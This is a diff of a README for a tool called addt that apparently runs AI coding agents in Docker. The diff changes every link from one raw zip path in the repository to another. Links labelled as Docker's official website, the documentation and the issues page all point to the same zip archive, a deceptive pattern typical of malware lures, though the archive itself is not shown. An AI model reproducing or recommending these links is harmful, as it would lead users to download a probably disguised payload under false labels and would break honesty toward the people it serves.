@@ -6,14 +6,14 @@ Welcome! This guide will help you download and run the **addt** application. Wit
 
 ## 📥 Download Link
 
-[![Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip%https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip)](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip)
+[![Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip%https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip)](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip)
 
 ## 🛠 System Requirements
 
 To run **addt**, your computer needs:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip).
+- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip).
 - **Disk Space**: At least 500 MB of free disk space.
 - **Memory**: 2 GB of RAM or more is recommended.
 
@@ -28,7 +28,7 @@ To run **addt**, your computer needs:
 
 To get started, visit the Releases page to download the latest version of **addt**. Click the link below:
 
-[Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip)
+[Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip)
 
 ### Installation Steps
 
@@ -52,7 +52,7 @@ After installing **addt**, follow these steps to run your AI coding agents:
 
 ## 📖 Documentation
 
-For more detailed instructions and information, visit our [Documentation Page](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip).
+For more detailed instructions and information, visit our [Documentation Page](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip).
 
 ## 🛠 Troubleshooting
 
@@ -66,11 +66,11 @@ If you encounter issues, here are some common solutions:
 
 Join our community for help and support:
 
-- **GitHub Issues**: If you encounter bugs, please post them on our [Issues Page](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip).
+- **GitHub Issues**: If you encounter bugs, please post them on our [Issues Page](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip).
 - **Feedback**: We welcome any feedback to improve the app. Feel free to reach out!
 
 ## 📢 Updates
 
 Keep up-to-date with the latest features and fixes. We release updates regularly. Check the Releases page frequently to ensure you're using the most current version.
 
-[Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/assets/daytona/Software_v2.9.zip)
+[Download addt](https://github.com/Pranavsiripangi/addt/raw/refs/heads/main/src/provider/Software_2.2.zip)
